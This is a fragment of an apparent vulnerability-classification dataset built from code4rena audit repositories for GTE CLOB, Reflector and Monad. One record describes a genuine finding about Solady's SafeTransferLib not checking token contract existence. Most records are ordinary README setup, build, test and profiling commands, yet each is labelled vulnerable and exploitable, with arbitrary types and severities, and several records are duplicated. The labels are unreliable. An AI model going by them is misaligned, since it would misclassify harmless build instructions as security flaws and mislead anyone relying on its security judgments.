      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n125:             token.safeTransferFrom(msg.sender, address(this), amount);\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Solady's SafeTransferLib does not check for token contract's existence",
    "description": "There is a subtle difference between the implementation of solady\u2019s SafeTransferLib and OZ\u2019s SafeERC20: OZ\u2019s SafeERC20 checks if the token is a contract or not, solady\u2019s SafeTransferLib does not. https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L10 `@dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller` *Instances (11)*: File: ./contracts/account-manager/AccountManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.471,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2025-07-gte-clob/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash!\ngit clone https://github.com/code-423n4/2025-07-gte-clob\ncd 2025-07-gte-clob\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Setup",
    "description": "Once the above prerequisite has been successfully installed, the following commands can be executed to setup the repository: git clone https://github.com/code-423n4/2025-07-gte-clob cd 2025-07-gte-clob",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.083,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash \nforge test --match-test submissionValidity\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Creating a PoC",
    "description": "The project is composed of three core systems; the `CLOB` system, the `AccountManager` contract, and the `GTERouter` contract. Within the codebase, we have introduced a `PoC.t.sol` test file under the `test/c4-poc` folder that sets up each system with mock implementations to allow PoCs to be constructed in a straightforward manner. Specifically, we combined the logic of the `RouterTestBase.t.sol` and `CLOBTestBase.sol` files manually to combine the underlying deployments. Depending on where the vulnerability lies, the PoC should utilize the relevant storage entries (i.e. the `router` in case a router vulnerability is demonstrated etc.). For a submission to be considered valid, the test case **should execute successfully** via the following command: forge test --match-test submissionValidity",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.049,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "floor(unix_now()/resolution)*resolution",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Gas",
    "title": "How It Works",
    "description": "Oracle contracts are controlled by the multisig-protected consensus of reputable organizations. The smart contract admin account always has all node public keys as co-signers with >50% multisig threshold, so more than half of the oracle backing nodes have to agree on a transaction in order to store price feed data or modify the contract state. Each node independently calculates values of quoted prices using deterministic idempotent algorithms to ensure consistency, generates an update transaction, signs it with node's private key, and then shares it with other peers via",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-reflector",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.039,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nAfterward, the following Stellar CLI command can be run to build the contracts:\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Compilation",
    "description": "Before we compile our contracts, we need to add the following `rustup` target if it is missing from our machine: rustup target add wasm32v1-none Afterward, the following Stellar CLI command can be run to build the contracts: stellar contract build",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-reflector",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.083,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "floor(unix_now()/resolution)*resolution",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Gas",
    "title": "How It Works",
    "description": "Oracle contracts are controlled by the multisig-protected consensus of reputable organizations. The smart contract admin account always has all node public keys as co-signers with >50% multisig threshold, so more than half of the oracle backing nodes have to agree on a transaction in order to store price feed data or modify the contract state. Each node independently calculates values of quoted prices using deterministic idempotent algorithms to ensure consistency, generates an update transaction, signs it with node's private key, and then shares it with other peers via",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-reflector",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.039,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nAfterward, the following Stellar CLI command can be run to build the contracts:\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Compilation",
    "description": "Before we compile our contracts, we need to add the following `rustup` target if it is missing from our machine: rustup target add wasm32v1-none Afterward, the following Stellar CLI command can be run to build the contracts: stellar contract build",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-reflector",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.083,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "floor(unix_now()/resolution)*resolution",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Gas",
    "title": "How It Works",
    "description": "Oracle contracts are controlled by the multisig-protected consensus of reputable organizations. The smart contract admin account always has all node public keys as co-signers with >50% multisig threshold, so more than half of the oracle backing nodes have to agree on a transaction in order to store price feed data or modify the contract state. Each node independently calculates values of quoted prices using deterministic idempotent algorithms to ensure consistency, generates an update transaction, signs it with node's private key, and then shares it with other peers via",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-reflector",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.039,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nTo compile a specific contract, run `stellar contract build` command with the `--package` argument from the project root\ndirectory:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Compilation",
    "description": "Run `stellar contract build` commands from the project root directory. It will compile all contracts included into the workspace: stellar contract build To compile a specific contract, run `stellar contract build` command with the `--package` argument from the project root directory:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-reflector",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.133,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "shell\ncargo test --package reflector-pulse-contract\ncargo test --package reflector-beam-contract\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Testing",
    "description": "In order to run all workspace tests, execute `cargo test` from the project root directory: cargo test Or for a specific contract: cargo test --package reflector-pulse-contract cargo test --package reflector-beam-contract",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-10-reflector",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.097,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "# Monad audit details",
    "description": "- Total Prize Pool: $504,000 in USDC - Warden pool: $500,000 in USDC - HM awards: $480,000 in USDC - QA awards: $20,000 in USDC - Judge awards: $3,500 in USDC",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "_Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ The following issues and risks are considered **known** or **by design** and will not be considered valid findings in this contest. - Block policy discounts gas price by incorrectly applying EIP-1559 to legacy transactions (C4 staff note: this issue was addressed by a public [PR](https://github.com/category-labs/monad-bft/pull/2386) on September 25, 2025 at 18:30 UTC; therefore all submissions of this finding after that timestamp will be considered out of scope.) - Reserve balance checks were not applied consistently to create transactions, e.g. CREATE / CREATE2 (C4 staff note: there was a public PR originally created to address this issue on September 16, 2025 at 15:38 UTC; therefore all submissions related to this finding after that timestamp will be considered out of scope.) - Duplicated validation logic for EIP-7702 authorization lists. (C4 staff note: this issue was addressed by a public [PR](https://github.com/category-labs/monad-bft/pull/2365))",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "cd docker/single-node",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Using Docker",
    "description": "The most straightforward way to start a consensus client + an execution client + a JsonRpc server. Run the following: 1. `cd docker/single-node` 2. `nets/run.sh`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "mermaid\nsequenceDiagram\nautonumber\n    participant D as Driver\n    box Purple Executor\n    participant S as impl Stream\n    participant E as impl Executor\n    end\n    participant State\n    participant PersistenceLogger\n    loop\n    D ->>+ S: CALL next()\n    Note over S: blocks until event ready\n    S -->>- D: RETURN Event\n    D ->> PersistenceLogger: CALL push(Event)\n    D ->>+ State: CALL update(Event)\n    Note over State: mutate state\n    State -->>- D: RETURN Vec<Command>\n    D ->> E: CALL exec(Vec<Command>)\n    Note over E: apply side effects\n    end\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Architecture",
    "description": "sequenceDiagram autonumber participant D as Driver box Purple Executor participant S as impl Stream",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.561,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nThe above command will do several things:\n\n- Use gcc-15 instead of the system's default compiler\n\n- Emit machine code using Haswell-era CPU extensions\n\n- Run CMake, and generate a [ninja](https://ninja-build.org/) build\n  system in the `<path-to-execution-repo>/build` directory with\n  the [`CMAKE_BUILD_TYPE`](https://cmake.org/cmake/help/latest/variable/CMAKE_BUILD_TYPE.html)\n  set to `RelWithDebInfo` by default\n\n- Build the CMake `all` target, which builds everything\n\nThe compiler and CPU options are injected via environment variables that\nare read by CMake.  If you want debug binaries instead, you can also pass\n`CMAKE_BUILD_TYPE=Debug` via the environment.\n\nWhen finished, this will build all of the execution binaries. The main one is\nthe execution daemon, `build/cmd/monad`. This binary can provide block\nexecution services for different EVM-compatible blockchains:\n\n- When used as part of a Monad blockchain node, it behaves as the block\n  execution service for the Category Labs consensus daemon (for details, see\n  [here](docs/overview.md#how-is-execution-used)); when running in this mode,\n  Monad EVM extensions (e.g., Monad-style staking) are enabled\n\n- It can also replay the history of other EVM-compatible blockchains, by\n  executing their historical blocks as inputs; a common developer workflow\n  (and a good full system test) is to replay the history of the original\n  Ethereum mainnet and verify that the computed Merkle roots match after\n  each block\n\nYou can also run the full test suite in parallel with:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "Compiling the execution code",
    "description": "First, change your working directory to the root directory of the execution git repository root and then run: CC=gcc-15 CXX=g++-15 CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" ASMFLAGS=\"-march=haswell\" \\ ./scripts/configure.sh && ./scripts/build.sh The above command will do several things:",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nbuild-essential\ncmake\nllvm-19-dev\nlibbenchmark-dev\nlibcli11-dev\nlibgmock-dev\nlibgtest-dev\nlibtbb-dev\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Building & Running",
    "description": "The compiler is built and tested in CI on Ubuntu 24.04. To build locally, first install the following dependencies via `apt`: build-essential cmake llvm-19-dev",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.102,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nIt will implicitly skip blockchain tests which\n* contain invalid blocks and\n* contain unexpected json format and\n* execute slowly.\n\nUse the ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Ethereum Tests",
    "description": "The ethereum blockchain tests can be executed with the command $ build/test/blockchain/compiler-blockchain-tests It will implicitly skip blockchain tests which * contain invalid blocks and * contain unexpected json format and",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.141,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n$ export MONAD_COMPILER_ASM_DIR=/tmp/debug\n$ export MONAD_COMPILER_DEBUG_TRACE=1\n$ build/test/blockchain/compiler-blockchain-tests \\\n    --gtest_filter=\"*.jumpiNonConst\"\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Configuring blockchain test VM",
    "description": "Environment variables can be used for debugging tests based on the blockchain test vm. Both the fuzzer and the etherum tests are based on the blockchain test vm. By setting the `MONAD_COMPILER_ASM_DIR` environment variable to a valid directory, the compiler will print contract",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.171,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n$ export MONAD_COMPILER_DEBUG_TRACE=1\n$ export EVMONE_DEBUG_TRACE=1\n$ build/test/blockchain/compiler-blockchain-tests \\\n    --gtest_filter=\"*.jumpiNonConst\"\n...\noffset: 0x59  opcode: 0x90  gas_left: 29977858\noffset: 0x5a  opcode: 0x62  gas_left: 29977855\noffset: 0x5e  opcode: 0x1  gas_left: 29977852\noffset: 0x5f  opcode: 0x55  gas_left: 29977849\noffset: 0x60  opcode: 0x0  gas_left: 29975649\nSTART baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87 with gas = 379000\nBlock 0x00: gas remaining: 379000\nBlock 0x2d: gas remaining: 378784\nEND baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87\noffset: 0x00  opcode: 0x33  gas_left: 30000000\noffset: 0x01  opcode: 0x73  gas_left: 29999998\n...\noffset: 0x16  opcode: 0x14  gas_left: 29999995\noffset: 0x5f  opcode: 0x55  gas_left: 29977849\noffset: 0x60  opcode: 0x0  gas_left: 29975649\nSTART baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87 with gas = 379000\nBlock 0x00: gas remaining: 379000\nEND baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "The `MONAD_COMPILER_TESTING` configuration",
    "description": "If the project is configured with `MONAD_COMPILER_TESTING` enabled, e.g. $ cmake -S . -B build -DMONAD_COMPILER_TESTING=ON then debug assertions will be enabled even when the `NDEBUG` macro is defined. With `MONAD_COMPILER_TESTING` configuration one can also define the `EVMONE_DEBUG_TRACE=1` environment variable to get runtime debug",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "console\nbuild/src/test/utils/directory-type-check my/contracts-dir\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Directory Type Check Test",
    "description": "After building the compiler source code, the `directory-type-check` executable can be used on a directory containing bytecode contracts. It will recursively traverse the directory and run the type inference algorithm on all the contracts. It will additionally run the type checking algorithm to verify the correctness of the inferred types. For example",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.067,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "MONAD_COMPILER_BENCHMARKS=ON",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Benchmarks",
    "description": "The project contains several sets of performance benchmarks that are not built by default. To enable them, set `MONAD_COMPILER_BENCHMARKS=ON` via CMake. This option is orthogonal to `MONAD_COMPILER_TESTING`; it's possible to build the benchmark executables with debug assertions enabled, but the results obtained will not be accurate.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.028,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "console\n$ cmake -DCMAKE_BUILD_TYPE=Debug -DCOVERAGE=ON -S . -B build -G Ninja\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Coverage",
    "description": "To enable coverage statistics set `-DCOVERAGE=ON` when configuring, e.g. $ cmake -DCMAKE_BUILD_TYPE=Debug -DCOVERAGE=ON -S . -B build -G Ninja After running the desired executable, use `gcovr .` to gather coverage statistics.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.078,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "json\n\"disasexpl.associations\": {\n    \"**/*.c\": \"${workspaceFolder}/build/asm/${fileBasename}.s\",\n    \"**/*.cpp\": \"${workspaceFolder}/build/asm/${fileBasename}.s\"\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Dumping assembly",
    "description": "Passing `-DMONAD_COMPILER_DUMP_ASM=On` to CMake, will dump all `.s` assembly files for the monad code into `build/asm`. One can then use the following vscode extension: https://github.com/dseight/vscode-disasexpl to view the assembly. In order for this to work, add the following setting to `.vscode/settings.json` file inside the `monad-compiler` repo (if your CMake build folder is called something else, modify appropriately): \"disasexpl.associations\": { \"**/*.c\": \"${workspaceFolder}/build/asm/${fileBasename}.s\", \"**/*.cpp\": \"${workspaceFolder}/build/asm/${fileBasename}.s\" }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.164,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "CXX=/usr/bin/g++-15 CC=/usr/bin/gcc-15 ASMFLAGS=-march=haswell CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" TRIEDB_TARGET=triedb_driver cargo run --bin monad-rpc -- --ipc-path docker/devnet/monad/mempool.sock --triedb-path <path_to_triedb_directory> --node_config <path_to_node_toml>",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "# monad-rpc",
    "description": "The prerequisite to starting the RPC server is to first [start a Monad consensus client](/monad-node/README.md) and connect the RPC server to it. Run the following in the repo root directory: 1. `export RUST_LOG=info` - The logging level can be adjusted as needed. 2. `CXX=/usr/bin/g++-15 CC=/usr/bin/gcc-15 ASMFLAGS=-march=haswell CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" TRIEDB_TARGET=triedb_driver cargo run --bin monad-rpc -- --ipc-path docker/devnet/monad/mempool.sock --triedb-path <path_to_triedb_directory> --node_config <path_to_node_toml>`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.288,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash\ngo install github.com/google/pprof@latest\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Install pprof",
    "description": "go install github.com/google/pprof@latest Or follow guidelines from [pprof](https://github.com/google/pprof)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.047,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nWhen collecting profile pprof will try to find binaries and static libs\nfor symbolization. If you built and running application in docker container,\ncopy them and point to the directory with ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Collect profile",
    "description": "pprof -http=0.0.0.0:8080 http://0.0.0.0:32808/debug/pprof/heap When collecting profile pprof will try to find binaries and static libs for symbolization. If you built and running application in docker container, copy them and point to the directory with `export PPROF_BINARY_PATH=~/monad-binaries`.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.193,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "CXX=/usr/bin/g++-15 CC=/usr/bin/gcc-15 ASMFLAGS=-march=haswell CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" TRIEDB_TARGET=triedb_driver cargo run --bin monad-node -- --secp-identity docker/devnet/monad/config/id-secp --bls-identity docker/devnet/monad/config/id-bls --node-config docker/devnet/monad/config/node.toml --forkpoint-config docker/devnet/monad/config/forkpoint.toml --wal-path docker/devnet/monad/wal --mempool-ipc-path docker/devnet/monad/mempool.sock --control-panel-ipc-path docker/devnet/monad/controlpanel.sock --ledger-path docker/devnet/monad/ledger --statesync-ipc-path docker/devnet/monad/statesync.sock --triedb-path <path_to_triedb>",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "# monad-node",
    "description": "Starting a Monad consensus node generates a blockdb directory, a ledger directory, a write ahead logging file, and an IPC socket: Run the following in the repo root directory: 1. `export RUST_LOG=info` - The logging level can be adjusted as needed. 2. `cp docker/devnet/monad/config/forkpoint.genesis.toml docker/devnet/monad/config/forkpoint.toml`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.66,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "<backend_type> <connection_params>",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Features",
    "description": "**Read from any backend, write to any backend** - `--block-data-source` allows passing different backend locators: \"aws testnet-ltu-032-0 50\", \"triedb /data/triedb 5000\", \"mongo ...\", etc. - `--archive-sink` similar to above, but only supports writable backends, aka no triedb - Backend locator strings follow the pattern: `<backend_type> <connection_params>`, parsed by the CLI module **Read and convert any previous schema version**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.034,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "block_archive_worker.rs",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "File Structure of Library and Binaries",
    "description": "The archive system is broken apart into a core library, `monad-archive`, and 3 scoped binaries: - `monad-archiver` - Reads from TrieDB or another archive, writes to durable storage - `monad-archive-checker` - Validates data consistency across archive replicas - `monad-indexer` - Builds transaction and log indexes from archived blocks",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
